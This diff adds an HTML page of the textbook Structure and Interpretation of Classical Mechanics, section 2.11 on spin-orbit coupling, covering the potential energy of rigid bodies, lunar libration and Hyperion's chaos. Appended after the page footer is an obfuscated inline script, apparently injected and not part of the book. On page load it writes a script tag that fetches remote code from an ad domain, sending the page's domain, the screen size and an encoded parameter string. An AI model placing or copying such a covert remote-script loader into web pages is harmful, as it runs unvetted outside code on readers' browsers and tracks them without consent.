@@ -1,0 +1,466 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-30.html">previous</a></span><span>, <a href="book-Z-H-32.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_2.11"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_2.11">2.11&nbsp;&nbsp;Spin-Orbit Coupling</a></h2>
+<p><a name="%_idx_1378"></a>
+<a name="%_idx_1380"></a><a name="%_idx_1382"></a><a name="%_idx_1384"></a>The rotation of planets and natural satellites is affected by the
+gravitational forces from other celestial bodies.  As an extended
+application of the Lagrangian method for forced rigid bodies, we
+consider the rotation of celestial objects subject to gravitational
+forces.</p>
+<p>
+We first develop the form of the potential energy for the
+gravitational interaction of an extended body with an external point
+mass.  With this potential energy and the usual rigid-body kinetic
+energy we can form Lagrangians that model a number of systems.  We
+will take an initial look at the rotation of the Moon and Mercury;
+later, after we have developed more tools, we will return to study
+these systems.</p>
+<p>
+</p>
+<a name="%_sec_2.11.1"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_2.11.1">2.11.1&nbsp;&nbsp;Development of the Potential Energy</a></h3>
+<p><a name="%_idx_1386"></a><a name="%_idx_1388"></a><a name="%_idx_1390"></a>
+The first task is to develop convenient expressions for the
+gravitational potential energy of the interaction of a rigid body with
+a distant mass point.  A rigid body can be thought of as made of a large
+number of mass elements, subject to rigid coordinate constraints.  We
+have seen that the kinetic energy of a rigid body is conveniently
+expressed in terms of the moments of inertia of the body and the
+angular velocity vector, which in turn can be represented in terms of
+a suitable set of generalized coordinates.  The potential energy can
+be developed in a similar manner.  We first
+represent the potential energy in terms of moments of the mass
+distribution and later introduce generalized coordinates as particular
+parameters of the potential energy.  </p>
+<p>
+
+<a name="%_idx_1392"></a>The gravitational potential energy of a mass point and
+a rigid body (see figure&nbsp;<a href="#FIGURE_2.9">2.9</a>) is the sum of the 
+potential energy of the mass point with each mass element of the body:
+<a name="EQUATION_2.67"></a></p>
+<div align=left><img src="chap2-Z-G-80.gif" border="0"></div>
+<p>
+where <em>M</em>' is the mass of the external point mass, <em>r</em><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> is the
+distance between the point mass and the constituent mass element with
+index <img src="chap1-Z-G-D-21.gif" border="0">, <em>m</em><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> is the mass of this constituent element,
+and <em>G</em> is the gravitational constant.  Let <em>R</em> be the distance of the
+center of mass of the rigid body from the point mass; <em>R</em> is the
+magnitude of the vector <img src="chap1-Z-G-D-26.gif" border="0">  <tt>-</tt>  <img src="chap2-Z-G-D-2.gif" border="0">, where the external mass
+point has position <img src="chap1-Z-G-D-26.gif" border="0"> and the center of mass of the rigid body has position
+<img src="chap2-Z-G-D-2.gif" border="0">.  The vector from the center of mass to the constituent with
+index <img src="chap1-Z-G-D-21.gif" border="0"> is <img src="chap2-Z-G-D-3.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> and has magnitude
+<img src="chap1-Z-G-D-18.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub>.  The distance <em>r</em><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> is then given by the law of
+cosines as <em>r</em><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub><sup>2</sup>  =  <em>R</em><sup>2</sup>  +  <img src="chap1-Z-G-D-18.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub><sup>2</sup>  <tt>-</tt>  2 <img src="chap1-Z-G-D-18.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> <em>R</em> cos
+<img src="chap1-Z-G-D-19.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub>, where <img src="chap1-Z-G-D-19.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> is the angle between <img src="chap1-Z-G-D-26.gif" border="0">  <tt>-</tt> 
+<img src="chap2-Z-G-D-2.gif" border="0"> and <img src="chap2-Z-G-D-3.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub>.  The potential energy is then
+<a name="EQUATION_2.68"></a></p>
+<div align=left><img src="chap2-Z-G-81.gif" border="0"></div>
+<p>
+This is complete, but we need to find a representation that does not
+mention each constituent.</p>
+<p>
+<a name="FIGURE_2.9"></a></p>
+<div align=left><img src="chap2-Z-G-82.gif" border="0"></div>
+<p></p>
+<p>
+Typically, the size of celestial bodies is small compared to the
+distance between them.  We can make use of this to find a more
+compact representation of the potential energy.  If we expand the
+potential energy in the small ratio <img src="chap1-Z-G-D-18.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub>/<em>R</em> we find
+<a name="EQUATION_2.69"></a></p>
+<div align=left><img src="chap2-Z-G-83.gif" border="0"></div>
+<p>
+where <em>P</em><sub><em>l</em></sub> is the <em>l</em>th <a name="%_idx_1394"></a>Legendre polynomial.<a name="call_footnote_Temp_204" href="#footnote_Temp_204"><sup><small>15</small></sup></a>
+Interchanging the order of the summations yields:
+<a name="EQUATION_2.70"></a></p>
+<div align=left><img src="chap2-Z-G-85.gif" border="0"></div>
+<p>
+Successive terms in this expansion of the potential energy typically
+decrease very rapidly because celestial bodies are small
+compared to the distance between them.  We can compute an upper bound to the
+size of these terms by replacing each factor in the sum over
+<img src="chap1-Z-G-D-21.gif" border="0"> by an upper bound.  The Legendre polynomials all have
+magnitudes less than one for arguments in the range  <tt>-</tt> 1 to 1.  The
+distances <img src="chap1-Z-G-D-18.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> are all less than some maximum extent of the
+body&nbsp;<img src="chap1-Z-G-D-18.gif" border="0"><sub>max</sub>.  The sum over <em>m</em><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> times these upper bounds is
+just the total mass <em>M</em> times the upper bounds.  Thus
+<a name="EQUATION_2.71"></a></p>
+<div align=left><img src="chap2-Z-G-86.gif" border="0"></div>
+<p>
+We see that the upper bound on successive terms decreases by a factor
+<img src="chap1-Z-G-D-18.gif" border="0"><sub>max</sub> / <em>R</em>.  Successive terms may be smaller still.  For
+large bodies the gravitational force is strong enough to overcome the
+internal material strength of the body, so the body, over time,
+becomes nearly spherical.  Successive terms in the expansion of the
+potential are measures of the deviation of the mass distribution from
+a spherical mass distribution.  Thus for large bodies the higher-order
+terms are small because the bodies are nearly spherical.</p>
+<p>
+Consider the first few terms in <em>l</em>.  For <em>l</em> = 0 the sum over <img src="chap1-Z-G-D-21.gif" border="0">
+just gives the total mass <em>M</em> of the rigid body.  For <em>l</em> = 1 the sum
+over <img src="chap1-Z-G-D-21.gif" border="0"> is zero, as a consequence of choosing the origin of the
+<img src="chap2-Z-G-D-3.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> to be the center of mass.  For <em>l</em> = 2 we have to do
+a little more work.  The sum involves second moments of the mass
+distribution, and can be written in terms of moments of inertia of
+the rigid body:
+<a name="EQUATION_2.72"></a></p>
+<div align=left><img src="chap2-Z-G-87.gif" border="0"></div>
+<p>
+where <em>A</em>, <em>B</em>, and <em>C</em> are the principal moments of inertia, and <em>I</em>
+is the moment of inertia of the rigid body about the line between the
+center of mass of the body to the external point mass.  
+The moment <em>I</em> depends on the orientation of the rigid body relative
+to the line between the bodies.  The contributions to the potential
+energy up to <em>l</em> = 2 are then<a name="call_footnote_Temp_205" href="#footnote_Temp_205"><sup><small>16</small></sup></a>
+<a name="EQUATION_2.73"></a></p>
+<div align=left><img src="chap2-Z-G-88.gif" border="0"></div>
+<p>
+Let <img src="chap1-Z-G-D-21.gif" border="0">  =  cos <img src="chap1-Z-G-D-19.gif" border="0"><sub><em>a</em></sub>, <i>&szlig;</i>  =  cos <img src="chap1-Z-G-D-19.gif" border="0"><sub><em>b</em></sub>, and <img src="chap1-Z-G-D-1.gif" border="0">  = 
+cos <img src="chap1-Z-G-D-19.gif" border="0"><sub><em>c</em></sub> be the direction cosines of the angles 
+<img src="chap1-Z-G-D-19.gif" border="0"><sub><em>a</em></sub>, <img src="chap1-Z-G-D-19.gif" border="0"><sub><em>b</em></sub> and <img src="chap1-Z-G-D-19.gif" border="0"><sub><em>c</em></sub> between the
+principal axes hata, <img src="chap2-Z-G-D-13.gif" border="0">, and <img src="chap2-Z-G-D-14.gif" border="0"> and the line between
+the center of mass and the point mass.<a name="call_footnote_Temp_206" href="#footnote_Temp_206"><sup><small>17</small></sup></a>
+A little algebra shows that <em>I</em>  = 
+<img src="chap1-Z-G-D-21.gif" border="0"><sup>2</sup> <em>A</em>  +  <i>&szlig;</i><sup>2</sup> <em>B</em>  +  <img src="chap1-Z-G-D-1.gif" border="0"><sup>2</sup> <em>C</em>.  The potential energy is then
+<a name="EQUATION_2.74"></a></p>
+<div align=left><img src="chap2-Z-G-89.gif" border="0"></div>
+<p>
+This is a good first approximation to the potential energy of
+interaction for most situations in the solar system; if we intended to 
+land on the Moon we probably would want to take into account higher-order terms in the expansion.</p>
+<p>
+</p>
+<p><a name="%_thm_2.14"></a>
+<b>Exercise 2.14.</b>&nbsp;&nbsp;<strong></strong><br></p>
+<p>
+<br><strong>a</strong>.&nbsp;&nbsp;Fill in the details that show that the sum over constituents
+in equation&nbsp;(<a href="#EQUATION_2.72">2.72</a>) can be expressed as written in
+terms of moments of inertia.  In particular, show that 
+</p>
+<div align=left><img src="chap2-Z-G-90.gif" border="0"></div>
+<p>
+</p>
+<div align=left><img src="chap2-Z-G-91.gif" border="0"></div>
+<p>
+and that 
+</p>
+<div align=left><img src="chap2-Z-G-92.gif" border="0"></div>
+<p></p>
+<p>
+<strong>b</strong>.&nbsp;&nbsp;Show that if the principal moments of inertia of a rigid body are <em>A</em>,
+<em>B</em>, and <em>C</em>, then the moment of inertia about an axis that goes
+through the center of mass of the body with direction cosines
+<img src="chap1-Z-G-D-21.gif" border="0">, <i>&szlig;</i>, and <img src="chap1-Z-G-D-1.gif" border="0"> relative to the principal axes is
+</p>
+<div align=left><img src="chap2-Z-G-93.gif" border="0"></div>
+<p></p>
+<p>
+</p>
+
+<p></p>
+<p>
+</p>
+<a name="%_sec_2.11.2"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_2.11.2">2.11.2&nbsp;&nbsp;Rotation of the Moon and Hyperion</a></h3>
+<p>
+<a name="%_idx_1398"></a><a name="%_idx_1400"></a><a name="%_idx_1402"></a><a name="%_idx_1404"></a><a name="%_idx_1406"></a><a name="%_idx_1408"></a><a name="%_idx_1410"></a>
+The approximation to the potential energy that we have derived can be
+used for a number of different problems.  It can be used
+to investigate the effect of <a name="%_idx_1412"></a>oblateness on the evolution of an
+artificial satellite about the Earth, or to incorporate the effect of
+planetary oblateness on the evolution of the orbits of natural
+satellites, such as the Moon or the Galilean satellites of Jupiter.
+However, as the principal application here, we will use it to
+investigate the rotational dynamics of natural satellites and planets.</p>
+<p>
+The potential energy depends on the position of the point
+mass relative to the rigid body and on the orientation of the rigid
+body.  Thus the changing orientation is coupled to the orbital
+evolution; each affects the other.  However, in many situations the
+effect of the orientation of the body on the evolution of the orbit
+may be ignored.  One way to see this is to look at the
+relative magnitudes of the two terms in the potential
+energy&nbsp;(<a href="#EQUATION_2.74">2.74</a>).  We already know that the second
+term is guaranteed to be smaller than the first by a factor of
+(<img src="chap1-Z-G-D-18.gif" border="0"><sub>max</sub> / <em>R</em>)<sup>2</sup>, but often it is much smaller still because
+the body involved is nearly spherical.  For example, the radius of the
+Moon is about a third the radius of the Earth and the distance to the
+Moon is about 60 Earth-radii.  So the second term is smaller than the
+first by a factor of order 10<sup><tt>-</tt>4</sup> due to the size factors.  In
+addition, the Moon is roughly spherical and for any orientation the
+combination <em>A</em>  +  <em>B</em>  +  <em>C</em>  <tt>-</tt>  3<em>I</em> is of order 10<sup><tt>-</tt>4</sup><em>C</em>.  Now <em>C</em> is
+itself of order  (2/5)<em>M</em><em>R</em><sup>2</sup>, because the density of
+the Moon does not vary strongly with radius.  So for the Moon
+the second term is of order 10<sup><tt>-</tt>8</sup> relative to the first.  Even
+radical changes in the orientation of the Moon would have little
+dynamical effect on its orbit.</p>
+<p>
+
+We can learn some important qualitative aspects of the orientation
+dynamics by studying a simplified model problem.  First, we
+assume that the body is rotating about its largest moment of inertia.
+This is a natural assumption.  Remember that for a free rigid body the
+loss of energy while conserving angular momentum leads to rotation
+about the largest moment of inertia.  This is observed for most bodies
+in the solar system.  Next, we assume that the spin axis is
+perpendicular to the orbital motion.  This is a good approximation for
+the rotation of natural satellites, and is a natural consequence of
+<a name="%_idx_1414"></a><a name="%_idx_1416"></a><a name="%_idx_1418"></a>tidal friction -- dissipative solid-body tides raised on the
+satellite by the gravitational interaction with the planet.  Finally,
+for simplicity we take the rigid body to be moving on a fixed elliptic
+orbit.  This may approximate the motion of some physical systems,
+provided the time scale of the evolution of the orbit is large compared
+to any time scale associated with the rotational dynamics we are
+investigating. So we have a nice toy problem, one that has been
+used to investigate the rotational <a name="%_idx_1420"></a><a name="%_idx_1422"></a><a name="%_idx_1424"></a>dynamics of Mercury, the Moon, and
+other natural satellites.  It makes specific predictions concerning
+the rotation of <a name="%_idx_1426"></a>Phobos, a satellite of Mars, that can be compared
+with observations.  It provides a basic explanation of the fact that
+Mercury rotates precisely three times for every two orbits it completes, and
+is the starting point for understanding the chaotic tumbling of
+Saturn's satellite Hyperion.</p>
+<p>
+<a name="FIGURE_2.10"></a></p>
+<div align=left><img src="chap2-Z-G-94.gif" border="0"></div>
+<p></p>
+<p>
+
+We are assuming that the orbit does not change or precess.  The orbit
+is an ellipse with the point mass at a focus of the ellipse.  The
+angle <em>f</em> (see figure&nbsp;<a href="#FIGURE_2.10">2.10</a>) measures the position of
+the rigid body in its orbit relative to the point in the orbit at
+which the two bodies are closest.<a name="call_footnote_Temp_208" href="#footnote_Temp_208"><sup><small>18</small></sup></a>
+We assume the orbit is a fixed ellipse, so the angle <em>f</em> and the
+distance <em>R</em> are periodic functions of time, with period equal to the
+orbit period.  With the spin axis constrained to be perpendicular to
+the orbit plane, the orientation of the rigid body is specified by a
+single degree of freedom: the orientation of the body about the spin
+axis.  We specify this orientation by the generalized coordinate
+<img src="chap1-Z-G-D-19.gif" border="0"> that measures the angle to the hata principal axis from
+the same line from which we measure <em>f</em>, the line through the point of closest
+approach.</p>
+<p>
+Having specified the coordinate system, we can work out the
+details of the kinetic and potential energies, and thus find the
+Lagrangian.  The kinetic energy is 
+<a name="EQUATION_2.75"></a></p>
+<div align=left><img src="chap2-Z-G-95.gif" border="0"></div>
+<p>
+where <em>C</em> is the moment of inertia about the spin axis and the
+angular velocity of the body about the <img src="chap2-Z-G-D-14.gif" border="0"> axis is 
+<img src="chap1-Z-G-D-20.gif" border="0">.   There is no component of angular velocity on the
+other principal axes.</p>
+<p>
+
+To get an explicit expression for the potential energy we must write
+the direction cosines in terms of <img src="chap1-Z-G-D-19.gif" border="0"> and <em>f</em>: <img src="chap1-Z-G-D-21.gif" border="0">  =  cos
+<img src="chap1-Z-G-D-19.gif" border="0"><sub><em>a</em></sub>  =   <tt>-</tt>  cos (<img src="chap1-Z-G-D-19.gif" border="0">  <tt>-</tt>  <em>f</em>), <i>&szlig;</i>  =  cos <img src="chap1-Z-G-D-19.gif" border="0"><sub><em>b</em></sub>  =  sin (<img src="chap1-Z-G-D-19.gif" border="0">
+ <tt>-</tt>  <em>f</em>), and <img src="chap1-Z-G-D-1.gif" border="0">  =  cos <img src="chap1-Z-G-D-19.gif" border="0"><sub><em>c</em></sub>  =  0 because the <img src="chap2-Z-G-D-14.gif" border="0"> axis is
+perpendicular to the orbit plane.  The potential energy is then
+<a name="EQUATION_2.76"></a></p>
+<div align=left><img src="chap2-Z-G-96.gif" border="0"></div>
+<p>
+Since we are assuming that the orbit is given, we need
+keep only terms that depend on <img src="chap1-Z-G-D-19.gif" border="0">.  Expanding the squares of
+the cosine and the sine in terms of the double angles and dropping
+all the terms that do not depend on <img src="chap1-Z-G-D-19.gif" border="0">, we find the 
+potential energy for the orientation<a name="call_footnote_Temp_209" href="#footnote_Temp_209"><sup><small>19</small></sup></a>
+<a name="EQUATION_2.76"></a></p>
+<div align=left><img src="chap2-Z-G-97.gif" border="0"></div>
+<p>
+<a name="%_idx_1434"></a><a name="%_idx_1436"></a>A Lagrangian for the model spin-orbit coupling problem is then <em>L</em> = <em>T</em> <tt>-</tt> <em>V</em>:
+<a name="EQUATION_2.77"></a></p>
+<div align=left><img src="chap2-Z-G-98.gif" border="0"></div>
+<p>
+<a name="%_idx_1438"></a>We introduce the dimensionless ``out-of-roundness'' parameter 
+<a name="EQUATION_2.78"></a></p>
+<div align=left><img src="chap2-Z-G-99.gif" border="0"></div>
+<p>
+and use the fact that the orbit frequency <em>n</em> satisfies <a name="%_idx_1440"></a>Kepler's third law
+<em>n</em><sup>2</sup> <em>a</em><sup>3</sup>  =  <em>G</em>(<em>M</em>  +  <em>M</em>'), which is approximately <em>n</em><sup>2</sup> <em>a</em><sup>3</sup>  =  <em>G</em><em>M</em>' for a
+small body in orbit around a much more massive one (<em>M</em> &lt;&lt; <em>M</em>').
+In terms of <img src="chap1-Z-G-D-12.gif" border="0"> and <em>n</em> the spin-orbit Lagrangian
+is
+<a name="EQUATION_2.79"></a></p>
+<div align=left><img src="chap2-Z-G-100.gif" border="0"></div>
+<p>
+This is a problem with one degree of freedom with terms that vary
+periodically with time.</p>
+<p>
+<a name="%_idx_1442"></a><a name="%_idx_1444"></a>The Lagrange equations are derived in the usual manner:
+<a name="EQUATION_2.80"></a></p>
+<div align=left><img src="chap2-Z-G-101.gif" border="0"></div>
+<p>
+The equation of motion is very similar to that of the <a name="%_idx_1446"></a><a name="%_idx_1448"></a>periodically
+driven pendulum.  The main difference here is that not only is the
+strength of the acceleration changing periodically, but in the
+spin-orbit problem the center of attraction is also varying periodically.</p>
+<p>
+
+We can give a physical interpretation of this equation of motion. It
+states that the rate of change of the angular momentum is equal to the
+<a name="%_idx_1450"></a>applied torque.  The torque on the body arises because the body is out
+of round and the gravitational force varies as the inverse square of
+the distance.  Thus the force per unit mass on the near side of the
+body is a little more than the acceleration of the body as a whole, and the
+force per unit mass on the far side of the body is a little less than
+the acceleration of the body as a whole.  Thus, relative to the
+acceleration of the body as a whole, the far side is forced outward
+while the inner part of the body is forced inward.  The net effect is
+a torque on the body that tries to align the long axis of the body
+with the line to the external point mass.  If <img src="chap1-Z-G-D-19.gif" border="0"> is a bit larger
+than <em>f</em> then there is a negative torque, and if <img src="chap1-Z-G-D-19.gif" border="0"> is a bit
+smaller than <em>f</em> then there is a positive torque, both of which would
+align the long axis with the planet if given a fair chance.  The
+torque arises because of the difference of the inverse <em>R</em><sup>2</sup> force
+across the body, so the torque is proportional to <em>R</em><sup><tt>-</tt>3</sup>.  There is
+a torque only if the body is out of round, for otherwise there is no
+handle to pull on.  This is reflected in the factor <em>B</em> <tt>-</tt> <em>A</em>
+in the expression for the torque.  The potential depends only
+on the moment of inertia, and thus the body has the same dynamics if it is
+rotated by 180<sup><small>o</small></sup>.  The factor of 2 in the argument of sine
+reflects this symmetry.  This torque is called the ``gravity gradient
+torque.''</p>
+<p>
+<a name="FIGURE_2.11"></a></p>
+<div align=left><img src="chap2-Z-G-102.gif" border="0"></div>
+<p></p>
+<p>
+To compute the evolution requires a lot of detailed preparation
+similar to what has been done for other problems.  There are many
+interesting phenomena to explore.  We can take parameters appropriate
+for the <a name="%_idx_1452"></a>Moon and find that Mr.&nbsp;Moon does not constantly point the
+same face to the Earth, but instead constantly shakes his head in
+dismay at what goes on here.  If we nudge the Moon a bit, say by
+hitting it with an asteroid, we find that the long axis oscillates
+back and forth with respect to the direction that points to the Earth.
+For the Moon, the orbital eccentricity is currently about 0.05, and
+the out-of-roundness parameter is about <img src="chap1-Z-G-D-12.gif" border="0">  =  0.026.
+Figure&nbsp;<a href="#FIGURE_2.11">2.11</a> shows the angle <img src="chap1-Z-G-D-19.gif" border="0">  <tt>-</tt>  <em>f</em> as
+a function of time for two different values of the ``lunar''
+eccentricity.  The plot spans 50 lunar orbits, or a little under four
+years. This Moon has been kicked by a large asteroid and has initial
+rotational angular velocity <img src="chap1-Z-G-D-20.gif" border="0"> equal to 1.01 times the
+orbit frequency.  The initial orientation is <img src="chap1-Z-G-D-19.gif" border="0">  =  0.  The smooth
+trace shows the evolution if the orbital eccentricity is set to zero.
+We see an oscillation with a period of about 40 lunar orbits or
+about three years.  The more wiggly trace shows the evolution of <img src="chap1-Z-G-D-19.gif" border="0">  <tt>-</tt> 
+<em>f</em> with an orbital eccentricity of 0.05, near the current lunar
+eccentricity.  The lunar eccentricity superimposes an apparent shaking
+of the face of the Moon back and forth with the period of the lunar
+orbit.  Though the Moon does slightly change its rate of rotation
+during the course of its orbit, most of this shaking is due to the
+nonuniform motion of the Moon in its elliptical orbit.  This
+oscillation, called the <a name="%_idx_1454"></a><a name="%_idx_1456"></a><a name="%_idx_1458"></a>``optical libration of the Moon,''
+allows us to see a bit more than half of the Moon's surface.  The
+longer-period oscillation induced by the kick is called the <a name="%_idx_1460"></a><a name="%_idx_1462"></a><a name="%_idx_1464"></a>``free
+libration of the Moon.''  It is ``free'' because we are free to excite
+it by choosing appropriate initial conditions.  The mismatch of the
+orientation of the Moon caused by the optical libration actually
+produces a periodic torque on the Moon, which slightly speeds it up and
+slows it down during every orbit.  The resulting oscillation is
+called the <a name="%_idx_1466"></a><a name="%_idx_1468"></a><a name="%_idx_1470"></a>``forced libration of the Moon,'' but it is too small to
+see in this plot.</p>
+<p>
+
+The oscillation period of the free libration is easily calculated.  We
+see that the eccentricity of the orbit does not substantially affect
+the period, so we consider the special case of zero eccentricity.  In
+this case <em>R</em>  =  <em>a</em>, a constant, and <em>f</em>(<em>t</em>)  =  <em>n</em> <em>t</em>, where <em>n</em> is the orbital
+frequency (traditionally called the <a name="%_idx_1472"></a><em>mean motion</em>).  The equation
+of motion becomes
+<a name="EQUATION_2.81"></a></p>
+<div align=left><img src="chap2-Z-G-103.gif" border="0"></div>
+<p>
+Let <img src="chap1-Z-G-D-16.gif" border="0">(<em>t</em>)  =  <img src="chap1-Z-G-D-19.gif" border="0">(<em>t</em>)  <tt>-</tt>  <em>n</em> <em>t</em>, and consequently <em>D</em><img src="chap1-Z-G-D-16.gif" border="0">(<em>t</em>)  =  <em>D</em><img src="chap1-Z-G-D-19.gif" border="0">(<em>t</em>)
+ <tt>-</tt>  <em>n</em>, and <em>D</em><sup>2</sup><img src="chap1-Z-G-D-16.gif" border="0">  =  <em>D</em><sup>2</sup><img src="chap1-Z-G-D-19.gif" border="0">.  Substituting these, the equation
+governing the evolution of <img src="chap1-Z-G-D-16.gif" border="0"> is
+<a name="EQUATION_2.82"></a></p>
+<div align=left><img src="chap2-Z-G-104.gif" border="0"></div>
+<p>
+For small deviations from synchronous rotation (small <img src="chap1-Z-G-D-16.gif" border="0">) this is
+<a name="EQUATION_2.83"></a></p>
+<div align=left><img src="chap2-Z-G-105.gif" border="0"></div>
+<p>
+so we see that the small-amplitude oscillation frequency of <img src="chap1-Z-G-D-16.gif" border="0"> 
+is&nbsp;<em>n</em><img src="chap1-Z-G-D-12.gif" border="0">.  For the Moon, <img src="chap1-Z-G-D-12.gif" border="0"> is about 0.026, so the period
+is about 1/0.026 orbit periods or about 40 lunar orbit periods, which
+is what we observed.</p>
+<p>
+<a name="FIGURE_2.12"></a></p>
+<div align=left><img src="chap2-Z-G-106.gif" border="0"></div>
+<p></p>
+<p>
+
+It is perhaps more fun to see what happens if the out-of-roundness
+parameter is large.  After our experience with the driven pendulum it
+is no surprise that we find abundant chaos in the spin-orbit problem
+when the system is strongly driven by having large <img src="chap1-Z-G-D-12.gif" border="0"> and
+significant <em>e</em>.  There is indeed one body in the solar system that
+exhibits chaotic rotation -- Hyperion, a small satellite of Saturn.
+Though our toy model is not adequate for a complete account of Hyperion,
+we can show that it exhibits chaotic behavior for
+parameters appropriate for Hyperion.  We take <img src="chap1-Z-G-D-12.gif" border="0"> = 0.89 and
+<em>e</em> = 0.1.  Figure&nbsp;<a href="#FIGURE_2.12">2.12</a> shows <img src="chap1-Z-G-D-19.gif" border="0">  <tt>-</tt>  <em>f</em> for
+50 orbits, starting with <img src="chap1-Z-G-D-19.gif" border="0"> = 0 and <img src="chap1-Z-G-D-20.gif" border="0">  =  1.05.  We see
+that sometimes one face of the body oscillates facing the planet,
+sometimes the other face oscillates facing the planet, and sometimes
+the body rotates relative to the planet in either direction.</p>
+<p>
+If we relax our restriction that the spin axis be fixed
+perpendicular to the orbit, then we find that the Moon maintains this
+orientation of the spin axis even if nudged a bit, but for Hyperion
+the spin axis almost immediately falls away from this configuration.
+The state in which Hyperion on average points one face to Saturn is
+dynamically unstable to chaotic tumbling.  Observations of Hyperion
+have confirmed that it is chaotically tumbling.</p>
+<p>
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_204" href="#call_footnote_Temp_204"><sup><small>15</small></sup></a> The
+Legendre polynomials <em>P</em><sub><em>l</em></sub> may be obtained by expanding the expression (1  +  <em>y</em><sup>2</sup>  <tt>-</tt>  2 <em>y</em>
+<em>x</em>)<sup><tt>-</tt>1/2</sup> as a power series in <em>y</em>.  The coefficient of <em>y</em><sup><em>l</em></sup> is
+<em>P</em><sub><em>l</em></sub>(<em>x</em>).  The first few Legendre polynomials are: <em>P</em><sub>0</sub>(<em>x</em>)  =  1,
+<em>P</em><sub>1</sub>(<em>x</em>)  =  <em>x</em>, <em>P</em><sub>2</sub>(<em>x</em>)  =   (3/2) <em>x</em><sup>2</sup>  <tt>-</tt>  
+(1/2), and so on.  The rest satisfy the recurrence relation
+</p>
+<div align=left><img src="chap2-Z-G-84.gif" border="0"></div>
+<p>  </p>
+
+<p><a name="footnote_Temp_205" href="#call_footnote_Temp_205"><sup><small>16</small></sup></a> This approximate representation of 
+the potential energy is sometimes called <a name="%_idx_1396"></a>MacCullagh's formula.</p>
+
+<p><a name="footnote_Temp_206" href="#call_footnote_Temp_206"><sup><small>17</small></sup></a> Watch out, we just reused
+<img src="chap1-Z-G-D-21.gif" border="0">.  It was also used as the constituent index.</p>
+
+<p><a name="footnote_Temp_208" href="#call_footnote_Temp_208"><sup><small>18</small></sup></a> Traditionally, the point in the orbit at which the two
+<a name="%_idx_1428"></a><a name="%_idx_1430"></a><a name="%_idx_1432"></a> bodies are closest is called the <em>pericenter</em> and the angle <em>f</em>
+is called the <em>true anomaly</em>.</p>
+
+<p><a name="footnote_Temp_209" href="#call_footnote_Temp_209"><sup><small>19</small></sup></a> The given potential energy differs from the actual potential
+energy in that non-constant terms that do not depend on <img src="chap1-Z-G-D-19.gif" border="0"> and
+consequently do not affect the evolution of <img src="chap1-Z-G-D-19.gif" border="0"> have been
+dropped.</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-30.html">previous</a></span><span>, <a href="book-Z-H-32.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD36OVl%2fDHuZfHXhIXS9Quy6Ne0OqpiZnwKauOk0PAy03DZGjIY7xoPGZDQKSHO8wmeeGmGYS7FrF7MrkI%2fgE%2bESeIC4IAQZG86dO71mzeehasA1oCCRgrXYmQRm00myILU7YceZolRJGLwtis4fwsCXlEHOoyMk8asRQ%2fC%2frVmintyFatM8baZJvbYZ3XgaNS6nm0ar2Eq%2bQOnOHahW1ua7kVuw7EFcU3uOCK5BapVERyb%2f9VjqFAtN5ezyo0s%2b9joJk1AFLacnggqYx1DHksNBwcc5gDpXfEhjkd7f1w%2baqtDyCRhETBzJ4LcTnEGxRj1ChbpMKAQ2pHnhYcEkdiyYWMuNOqupUbS2Mw68pWCicNM33sStU52e9bBa0s7%2f%2fLnW0uCdk%2f0CK0C3zrE3rIc8%2bmYD%2bvHMH5uvPOEMz4Dq%2bm2EVV8YnErTdWWzi9qBe05m%2bkyUBdS44S23RRF3IRuk");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
